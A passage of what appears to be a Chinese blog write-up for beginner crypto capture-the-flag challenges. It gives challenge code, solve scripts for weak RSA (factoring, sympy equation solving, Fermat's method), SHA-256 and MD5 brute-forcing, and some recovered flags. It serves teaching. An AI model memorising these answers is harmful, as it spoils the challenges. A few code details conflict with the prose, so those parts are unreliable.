class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> x:x + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(x)%<span class="number">16</span>))</span><br><span class="line">m = bytes_to_long(pad(flag))</span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*p*q*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e = <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line"><span class="string">c = 269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>值得注意的是<code>n=p*p*p*q</code>根据欧拉定理可以得到欧拉函数<code>phi = p*(p-1)*q*(q - 1)</code>。n直接factor爆破就能出p，q。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n = <span class="number">564070152909085514893862673848191100242629745476416876533996976389897932324860687952230733393080567203972999049426141761</span></span><br><span class="line">c = <span class="number">269509453821913281608300827585653465889617103481995203776655691658799441157871331220899710463748827149644657719450056013</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">709662686105519282917793669093</span> </span><br><span class="line">q = <span class="number">1058314117179226194777612760717</span></span><br><span class="line">phi = p*(p-<span class="number">1</span>)*q*(q - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="solve-the-equation"><a href="#solve-the-equation" class="headerlink" title="solve_the_equation"></a>solve_the_equation</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">gift = <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n,c,gift)</span><br><span class="line"><span class="comment"># 559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line"><span class="comment"># 73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line"><span class="comment"># 63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解方程，直接sympy库解非线性方程组，有俩解，取整数解那个即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">559013759419746202691240598235115105126834606071307611491891982898293133657843987454339580258031532272691584368719342942404675509580909313170933925796189789232538297110756754383546447669571766593521267667716779348776308179675709803388978100416839504625045239819627379469827980589668625084314985969634985583431058156810528172627873121320455715399011186280324236548934145366222271636328254497851289112650375015433741699898290781472376090171361276557886637892800404830030548291487615566596504234212554381817510798554015481259307992175226543595948798873846335558746933940683482819439715578130806800536423771482474206047548549237879025655562739463111822524633757040958223066367993671472508367287181357997804485542311011003871312708995599690715923692968372474814753669031805664070760705148563294700043336457334028810890271434599241312612447640877347296648737167576464851763570272180801042067934843953206083053874624644994067168364645748243999074053494066054657595233970985982095621265309066132852511490426399921749091156312387594448586826952283581592003247165562367202134878625798756167825941929996806801073247649667626854029875184014003650020610359836971629737204456239324237077361643697429780638179887750984791035339697744210904151734797</span></span><br><span class="line">c = <span class="number">73407318923483936681380982096598838839602514018601041044571793373013418096970487001956204920233481604663088115926046001478564679328045899017826536373925483312496867862798918521256833686293905627264784839084309695013473729502056597198558911052248943918139429481528120149662544426266704140382476129564563832751550189116712164319522536680400998100426969878312141399338984622535922004572374724499994480294086487511972287034778386491943792466926044305651852709046949243652756946391206931252732067537917128777152678266816232179411054474713462051435447023851233892017069674808619784767176865947753180156093197684363218543237706358137237603822953178987601908200096630034921280599733190041134038060644827637374731999991143342404380959195318030935855850625849684867326087432054830971960076859722417639414733054394674533018860606074648324450983897579183842853010968597034663149214229791831193351337193195298921766564073265470525286769595835642479920483047959570057149110246705969802722576770273329236163660486942433423522588321736639231667766680582482974393228214947178327111783901303686854030864244720750585928819691608599558058859371899416709995780300197269497143959726959313506292966639680257096421491364629690813416340577056873916752193925</span></span><br><span class="line">gift = <span class="number">63829120016023768052886024054478552450378183173692549289836790500844466624984770449526584263524969873611417764466777251459739549064993441916734929304056657281688756040121378172997367361118927461471925755841160032723693319039128805185488328610549652307644061769088611063117016010827595409949224043526660999362737741312450095192593608666286680915796697255817583078927076945852260612453896867746751729217633935143780193497702898684210698859292191506586139420497299988065973759272644964857853100511651254633164029275099534568064491202987945733565755982565356202756330311841048849063747767451397616638500281324618902190280761</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, <span class="number">2022</span> * p + <span class="number">9</span> * q + <span class="number">28</span> * e - gift], [p, q])</span><br><span class="line"><span class="built_in">print</span>(resture)</span><br></pre></td></tr></table></figure><p>p，q出了，RSA一把梭就行了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p = 31488299927163782375594305784598354985055343576902151378139638110290196067918972709864013036909993584566357500427488971564319756822589646977081872239028723217808372250207143372686512583814138881980368846428364451724191019810210583450208745323418623199057207740178726519465136933610452840086315545766227500114368026151391214297362847972215483754128409704386255997220347329566039222555930464490406419002226257326118774942404683970363544788642504594073256844610344691049585870560973659315882902006631997716334351866723219577903275769313404136367236735062099234386473703566068495328080598914833401280780692803508570349879</span><br><span class="line">q = 17753062588733343270481973113408741177364273466266578137604693537521130628067514464616655876995871735360322066932727884076111196635241747675042626304508770586691927800281585936137657405193182456402216484778567926375452998098111716574027285177466244350043079827469560084278792340806640810521556665260999347942843603815228875925103340718552529438783648172063716949726071718858811605089496505238883332792493647818670062684514188459512366295227468596668231188353669195967903222039580635681985850471261694526218866731687175727118621937360285536800367141087950091875609247828705723374310716178275472084635608436063660110043</span><br></pre></td></tr></table></figure><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p><img src="https://s2.loli.net/2023/08/04/wneuaFGNLryWcEi.png" alt="image-20221021105716950.png"></p><p>sha256爆破前四位。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;1dafe94b2a853521de7c2ef475c88dc446b9a92b67189d4f0905ecad71b2acef&quot;</span></span><br><span class="line">tail=<span class="string">&quot;aW56dn5niWISJkBo&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><h3 id="Chaos"><a href="#Chaos" class="headerlink" title="Chaos"></a>Chaos</h3><h3 id="Little-Lattice"><a href="#Little-Lattice" class="headerlink" title="Little Lattice"></a>Little Lattice</h3><h3 id="S1mple-ECB"><a href="#S1mple-ECB" class="headerlink" title="S1mple_ECB"></a>S1mple_ECB</h3><p>了解ecb的性质，是拼接的，取前32位和后32位，分别解密就行了</p><p>NSSCTF{ECB_m0de_1s_qui4e_s1mple}</p><h3 id="md5太残暴了"><a href="#md5太残暴了" class="headerlink" title="md5太残暴了"></a>md5太残暴了</h3><p>题目描述：</p><p>小明养成了定期修改密码的好习惯，同时，他还是一个CTF爱好者。有一天，他突发奇想，用flag格式来设置密码，为了防止忘记密码，他还把密码进行了md5加密。为了避免被其他人看到全部密码，他还特意修改了其中部分字符为#。你能猜出他的密码吗？<br>plaintext = flag<br>md5 = ac7f4d52c3924925aa9c8a7a1f522451<br>PS: 第一个#是大写字母，第二个#是小写字母，其他是数字。</p><p>md5爆破。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">plaintext = <span class="string">&quot;flag&#123;#00#_P4ssw0rd_N3v3r_F0rg3t_63####&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">Dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>)] <span class="comment">#小写字母</span></span><br><span class="line">dic = [<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>)] <span class="comment">#大写字母</span></span><br><span class="line">num = [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Dic)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dic)):</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num)):</span><br><span class="line">                    m = <span class="string">&#x27;flag&#123;&#x27;</span> + Dic[i] + <span class="string">&#x27;00&#x27;</span>+dic[j] + <span class="string">&#x27;_P4ssw0rd_N3v3r_F0rg3t_63&#x27;</span> + num[a] + num[b] + num[c]</span><br><span class="line">                    md5 = hashlib.md5(m.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> md5 == <span class="string">&#x27;ac7f4d52c3924925aa9c8a7a1f522451&#x27;</span>:</span><br><span class="line">                        <span class="built_in">print</span>(m , md5)</span><br></pre></td></tr></table></figure><h3 id="mathRSA"><a href="#mathRSA" class="headerlink" title="mathRSA"></a>mathRSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">hint = p**<span class="number">5</span> - q**<span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;h = <span class="subst">&#123;hint&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;f = <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943      </span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">c = 7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552       </span></span><br><span class="line"><span class="string">h = 130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>由题目可知，n=pq，hint=p^5 - q^4,由此我们可以构造出非线性方程组</p><p>pq-n=0</p><p>p^5 - q^4-hint=0</p><p>利用sympy库对其解方程组得到p,q。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p,q = symbols(<span class="string">&#x27;p q&#x27;</span>)</span><br><span class="line">resture = nonlinsolve([p*q - n, p**<span class="number">5</span> - q**<span class="number">4</span> - h], [p, q])</span><br></pre></td></tr></table></figure><p>解出p，q后一把梭就行了。</p><p>方法二：</p><p><code>hint=p**5 - q**4</code>，因为hint很大，所以<code>p**5</code>远大于<code>q**4</code>，可以直接对hint开5次方得到temp，此时temp&lt;p再循环取temp的下一个素数，直至n可以整除temp为止,就能得到p了。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">76236418318712173274495941060488893810931309177217802334230599201457092723011685048556311576262486371987147895332408646920500226769161418792142565209634495797142268681403865426056588605013602625268553194169434049817172340173907696496945054049859221379092764811535206778031226535614731731322630330166833765943</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">7207616060389865156270906240837846478541820008527247539698331406253371238674590766101711421196342768182325013873320402422918804780590951789425587131632422554819735000106070325708057225062376701298825910565526713270553888227235612227223162695870584803109353377288421750982913226189395526612487664144379690552</span></span><br><span class="line">h = <span class="number">130285072635228037239175162118613869214302695058325046962039091162567931492116336918638092534964417960274466351834311039222269165021532950982276262717322395682559639859781516047319178212473103057947426886870612637975024605166325017663998263834789814181250953051730859433354534450232382414565421858172075431133498326501045697132640582932453817599366612200146802110424409285814189125929844293789544163802323048780585398714263586547670912817768592459281775837372982750626103047573532664320692775783627129463700810934670066747044799514243631607384814191188276380589420289084574680852618867732847029105400406874790675559126905078326495799755425006555539699119063191489852930421412630857588890593040420277938268954008973405431053073576987401154763326417551463323055736754390446</span></span><br><span class="line">temp= gmpy2.iroot(h,<span class="number">5</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> n % temp !=<span class="number">0</span>:</span><br><span class="line">    temp =gmpy2.next_prime(temp)</span><br><span class="line">p = temp</span><br><span class="line">q = n//p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h2 id="Week3-1"><a href="#Week3-1" class="headerlink" title="Week3"></a>Week3</h2><h3 id="pnearq"><a href="#pnearq" class="headerlink" title="pnearq"></a>pnearq</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = next_prime(p)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(flag), e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 19421904767367129549329507820147867763064747101931314714173717122035977491291441314433180813343755107381230481007143328156292096871675328839756035726106037229325380698967544660649710464634698425387682458721466040894830503881966355435442651493212040443436714597490121865537266815247879839020846287255634123530517095030752832857842819836940083915495464712363169428825344678729929317207583197980607919720642725221740680718976635305544368542563503440076036727388062097647374046378854873864505267644315352602271587283702733779081805129429479541906613334092422428543951370065910195162721686773383508480268145903016615151713</span></span><br><span class="line"><span class="string">c = 16430654037742749931837577925393394466626615745270895225352757745284038922799868617243616416116392338428121605256850230862894296244375242336599929497221079420665154174930054597666915358687410522457846003186806053368237783147731665147575913322026626738697036282908055611350347494310666532700194563684837580022875526378181343082801716942536163583090541294011987732281942148455345223347021675781368596340860151253774597168954881987520338304516390785094435356412111780768446904948045448510663589654475221029009283144829902553888829840193614048967712676048740814622290029846433107762872806981599110271586325156855299974310</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>可以看到q = next_prime(p)，q是p的下一个质数，费马分解N即可。一个费马分解的小脚本。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">isqrt</span>(<span class="params">n</span>):</span><br><span class="line">  x = n</span><br><span class="line">  y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">while</span> y &lt; x:</span><br><span class="line">    x = y</span><br><span class="line">    y = (x + n // x) // <span class="number">2</span></span><br><span class="line">  <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat</span>(<span class="params">n, verbose=<span class="literal">True</span></span>):</span><br><span class="line">    a = isqrt(n) <span class="comment"># int(ceil(n**0.5))</span></span><br><span class="line">    b2 = a*a - n</span><br><span class="line">    b = isqrt(n) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> b*b != b2:</span><br><span class="line">        <span class="comment"># if verbose:</span></span><br><span class="line">        <span class="comment">#     print(&#x27;Trying: a=%s b2=%s b=%s&#x27; % (a, b2, b))</span></span><br><span class="line">        a = a + <span class="number">1</span></span><br><span class="line">        b2 = a*a - n</span><br><span class="line">        b = isqrt(b2) <span class="comment"># int(b2**0.5)</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">    p=a+b</span><br><span class="line">    q=a-b</span><br><span class="line">    <span class="keyword">assert</span> n == p * q</span><br><span class="line">    <span class="keyword">return</span> p, q</span><br><span class="line">fermat(n)</span><br></pre></td></tr></table></figure><h3 id="smallRSA"><a href="#smallRSA" class="headerlink" title="smallRSA"></a>smallRSA</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">rom Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span>+<span class="built_in">str</span>(uuid.uuid4())[:<span class="number">13</span>]+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line">p = getPrime(<span class="number">100</span>)</span><br><span class="line">q = getPrime(<span class="number">100</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span>(m &lt; n)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="comment"># print(f&quot;flag = &#123;flag&#125;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n = 625718246679843150194146350359795658237410693353450690028041</span></span><br><span class="line"><span class="string">c = 118795719073790634455854187484104547013000179946116068066473</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>n很小，factor爆破出p，q。</p><p>exp.py</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 